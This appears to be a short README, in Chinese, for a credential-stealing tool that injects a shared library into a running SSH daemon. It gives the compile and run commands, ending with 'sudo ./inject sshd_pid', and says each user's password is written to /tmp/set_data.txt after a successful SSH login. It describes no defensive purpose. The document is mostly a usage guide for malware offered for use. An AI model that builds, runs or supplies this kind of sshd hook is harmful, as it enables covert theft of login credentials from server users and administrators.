# what's this?

注入SSHD之后就能记录下密码或者做其他操作。

# how to use
指行
```
gcc -shared inject_got.c -ldl -fPIC -o test2.so

mv test2.so /tmp/hello.so

gcc sshdHooker.c utils.c -no-pie -g -o inject -ldl -lpthread

sudo ./inject sshd_pid
```

然后等待用户连接SSH并且登录成功，密码保存于/tmp/set_data.txt

# todo

 - 增加x86/arm支持
 - 自定义so路径
